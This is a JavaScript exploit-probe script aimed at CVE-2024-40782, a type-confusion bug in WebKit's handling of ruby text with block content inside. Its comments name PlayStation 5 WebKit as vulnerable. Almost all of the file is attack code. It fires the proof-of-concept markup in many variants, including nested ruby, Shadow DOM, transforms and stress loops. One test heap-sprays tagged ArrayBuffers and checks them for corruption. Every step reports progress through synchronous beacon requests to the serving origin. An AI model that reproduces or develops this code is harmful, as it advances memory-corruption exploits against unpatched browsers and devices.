// p189 — CVE-2024-40782 Ruby Block Continuation Type Confusion
// WebKit Bug 268770 — display:ruby + block in inline ruby base
// Fix: commit 279005@main (c2f9092d3a8e), May 20 2024.
// PS5 WebKit-1200 (Dec 2023) = VULNERABLE.
//
// Root cause: RenderTreeBuilderRuby::findOrCreateParentForStyleBasedRubyChild
// assumes parent.firstChild() is always the Ruby box. Block content inside
// inline ruby base forces continuations that insert anonymous wrappers.
// The code downcasts the wrapper to Ruby, accessing wrong fields -> crash.
//
// PoC: <ruby style="position:absolute"><rb><span>text<div>block</div></span></rb><rt>rt</rt></ruby>
//
// Beacon prefix: V189-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;

  function syncB(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V189-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  }

  syncB('BOOT');

  function forceLayout(el) {
    void (el || document.body).offsetHeight;
    void (el || document.body).getBoundingClientRect();
  }

  // ================================================================
  // TEST 1: Exact regression test PoC
  // position:absolute forces ruby to be block, div inside span
  // in rb creates continuation that splits anonymous ruby box.
  // ================================================================
  try {
    syncB('T1-START');

    var c1 = document.createElement('div');
    c1.innerHTML = '<ruby style="position:absolute">' +
      '<rb><span>base with <div>forced</div> line break</span></rb>' +
      '<rt>annotation</rt></ruby>';
    document.body.appendChild(c1);

    forceLayout(c1);
    syncB('T1-LAYOUT');

    // Force a style recalc
    var ruby1 = c1.querySelector('ruby');
    if (ruby1) {
      ruby1.style.color = 'red';
      forceLayout(c1);
      syncB('T1-RECALC');
    }

    c1.remove();
    syncB('T1-OK');
  } catch(e) {
    syncB('T1-ERR-' + (e.message || '').substring(0, 30));
  }

  // ================================================================
  // TEST 2: Multiple block elements inside ruby base
  // More aggressive continuation splitting
  // ================================================================
  try {
    syncB('T2-START');

    var c2 = document.createElement('div');
    c2.innerHTML =
      '<ruby style="position:absolute">' +
        '<rb><span>a<div>b1</div>c<div>b2</div>d<div>b3</div>e</span></rb>' +
        '<rt>rt1</rt>' +
      '</ruby>' +
      '<ruby style="position:fixed">' +
        '<rb><em>x<section>s1</section>y<article>a1</article>z</em></rb>' +
        '<rt>rt2</rt>' +
      '</ruby>';
    document.body.appendChild(c2);
    forceLayout(c2);
    syncB('T2-LAYOUT');

    c2.remove();
    syncB('T2-OK');
  } catch(e) {
    syncB('T2-ERR-' + (e.message || '').substring(0, 30));
  }

  // ================================================================
  // TEST 3: Dynamic tree modification after initial render
  // Render a normal ruby, then inject a block element to force
  // continuation after the render tree is built.
  // ================================================================
  try {
    syncB('T3-START');

    var c3 = document.createElement('div');
    c3.innerHTML = '<ruby style="position:absolute" id="r3">' +
      '<rb><span id="s3">normal text</span></rb>' +
      '<rt>rt</rt></ruby>';
    document.body.appendChild(c3);
    forceLayout(c3);
    syncB('T3-INITIAL');

    // Now inject a block element into the inline span
    var span3 = c3.querySelector('#s3');
    if (span3) {
      var blockDiv = document.createElement('div');
      blockDiv.textContent = 'INJECTED BLOCK';
      span3.appendChild(blockDiv);
      forceLayout(c3);
      syncB('T3-INJECTED');

      // Trigger another layout pass
      span3.style.color = 'blue';
      forceLayout(c3);
      syncB('T3-RECALC');

      // Remove and re-add the block
      blockDiv.remove();
      forceLayout(c3);
      span3.appendChild(blockDiv);
      forceLayout(c3);
      syncB('T3-TOGGLE');
    }

    c3.remove();
    syncB('T3-OK');
  } catch(e) {
    syncB('T3-ERR-' + (e.message || '').substring(0, 30));
  }

  // ================================================================
  // TEST 4: Nested ruby with cascading continuations
  // ================================================================
  try {
    syncB('T4-START');

    var c4 = document.createElement('div');
    c4.innerHTML =
      '<ruby style="position:absolute">' +
        '<rb>' +
          '<span>' +
            '<ruby style="position:absolute">' +
              '<rb><span>inner <div>block</div> text</span></rb>' +
              '<rt>inner-rt</rt>' +
            '</ruby>' +
          '</span>' +
        '</rb>' +
        '<rt>outer-rt</rt>' +
      '</ruby>';
    document.body.appendChild(c4);
    forceLayout(c4);
    syncB('T4-LAYOUT');

    c4.remove();
    syncB('T4-OK');
  } catch(e) {
    syncB('T4-ERR-' + (e.message || '').substring(0, 30));
  }

  // ================================================================
  // TEST 5: Rapid creation/destruction with heap spray
  // Create the PoC structure many times, destroy, spray.
  // ================================================================
  try {
    syncB('T5-START');

    var sprays = [];
    var ROUNDS = 50;

    for (var r = 0; r < ROUNDS; r++) {
      var c = document.createElement('div');
      c.innerHTML = '<ruby style="position:absolute">' +
        '<rb><span>r' + r + '<div>d' + r + '</div>e' + r + '</span></rb>' +
        '<rt>t' + r + '</rt></ruby>';
      document.body.appendChild(c);
      forceLayout(c);
      c.remove();

      // Spray after each removal
      if (r % 10 === 9) {
        for (var s = 0; s < 100; s++) {
          var ab = new ArrayBuffer(256);
          var v = new Uint32Array(ab);
          v[0] = 0x52554259; // "RUBY"
          v[1] = 0xDEAD0000 | r;
          sprays.push(ab);
        }
      }
    }

    syncB('T5-ROUNDS-' + ROUNDS);

    // Check spray integrity
    var corrupted = 0;
    for (var i = 0; i < sprays.length; i++) {
      var v = new Uint32Array(sprays[i]);
      if (v[0] !== 0x52554259) {
        corrupted++;
        if (corrupted <= 3) {
          syncB('T5-CORRUPT-' + i + '-' + v[0].toString(16));
        }
      }
    }
    syncB('T5-CORRUPT-' + corrupted);
    syncB('T5-OK');
  } catch(e) {
    syncB('T5-ERR-' + (e.message || '').substring(0, 30));
  }

  // ================================================================
  // TEST 6: display:ruby with table and flexbox
  // Other display modes that force block behavior
  // ================================================================
  try {
    syncB('T6-START');

    var displays = ['block', 'flex', 'grid', 'table', 'inline-block'];
    for (var di = 0; di < displays.length; di++) {
      var d = displays[di];
      var c6 = document.createElement('div');
      c6.innerHTML = '<ruby style="display:' + d + '">' +
        '<rb><span>text<div>block</div>more</span></rb>' +
        '<rt>rt</rt></ruby>';
      document.body.appendChild(c6);
      forceLayout(c6);
      syncB('T6-' + d.toUpperCase().substring(0, 5));
      c6.remove();
    }

    syncB('T6-OK');
  } catch(e) {
    syncB('T6-ERR-' + (e.message || '').substring(0, 30));
  }

  // ================================================================
  // TEST 7: Ruby with transforms and opacity
  // These properties create compositing layers which may interact
  // with the continuation bug path differently.
  // ================================================================
  try {
    syncB('T7-START');

    var c7 = document.createElement('div');
    c7.innerHTML =
      '<ruby style="position:absolute;transform:translateZ(0);opacity:0.5">' +
        '<rb><span>transform <div>block</div> path</span></rb>' +
        '<rt>rt</rt>' +
      '</ruby>' +
      '<ruby style="position:absolute;will-change:transform">' +
        '<rb><span>will-change <div>block</div> path</span></rb>' +
        '<rt>rt</rt>' +
      '</ruby>';
    document.body.appendChild(c7);
    forceLayout(c7);
    syncB('T7-LAYOUT');

    // Animate to trigger compositor
    var rubies = c7.querySelectorAll('ruby');
    for (var i = 0; i < rubies.length; i++) {
      rubies[i].style.transform = 'translateX(10px)';
    }
    forceLayout(c7);
    syncB('T7-ANIM');

    c7.remove();
    syncB('T7-OK');
  } catch(e) {
    syncB('T7-ERR-' + (e.message || '').substring(0, 30));
  }

  // ================================================================
  // TEST 8: Shadow DOM + ruby continuation
  // Ruby inside Shadow DOM with block content
  // ================================================================
  try {
    syncB('T8-START');

    var host = document.createElement('div');
    document.body.appendChild(host);

    var shadow = host.attachShadow({ mode: 'open' });
    shadow.innerHTML =
      '<style>:host { display: block; }</style>' +
      '<ruby style="position:absolute">' +
        '<rb><span>shadow <div>block</div> dom</span></rb>' +
        '<rt>rt</rt>' +
      '</ruby>';

    forceLayout(host);
    syncB('T8-SHADOW');

    // Modify shadow tree
    var sRuby = shadow.querySelector('ruby');
    if (sRuby) {
      sRuby.style.position = 'relative';
      forceLayout(host);
      sRuby.style.position = 'absolute';
      forceLayout(host);
      syncB('T8-TOGGLE');
    }

    host.remove();
    syncB('T8-OK');
  } catch(e) {
    syncB('T8-ERR-' + (e.message || '').substring(0, 30));
  }

  // ================================================================
  // TEST 9: Stress test — many rubies with block continuations
  // Rapid creation to maximize chance of hitting the bad path.
  // ================================================================
  try {
    syncB('T9-START');

    var c9 = document.createElement('div');
    document.body.appendChild(c9);

    for (var i = 0; i < 200; i++) {
      var ruby = document.createElement('ruby');
      ruby.style.position = 'absolute';
      ruby.innerHTML = '<rb><span>x<div>d</div>y</span></rb><rt>r</rt>';
      c9.appendChild(ruby);

      if (i % 50 === 49) {
        forceLayout(c9);
        syncB('T9-BATCH-' + (i + 1));
      }
    }

    forceLayout(c9);
    c9.remove();
    syncB('T9-OK');
  } catch(e) {
    syncB('T9-ERR-' + (e.message || '').substring(0, 30));
  }

  syncB('COMPLETE');
})();
